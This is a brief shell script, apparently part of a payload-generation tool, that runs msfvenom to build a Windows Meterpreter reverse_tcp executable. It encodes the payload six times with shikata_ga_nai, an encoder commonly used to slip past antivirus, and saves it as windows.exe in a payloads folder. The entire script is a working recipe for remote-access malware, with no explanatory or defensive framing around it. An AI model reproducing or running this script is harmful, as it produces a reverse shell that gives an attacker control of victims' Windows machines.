echo "[+] Creating Payload ==> Windows"
echo ""
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -e x86/shikata_ga_nai -i 6 -f exe -o windows.exe
mkdir payloads
mv windows.exe payloads
echo "[+] payload was created"
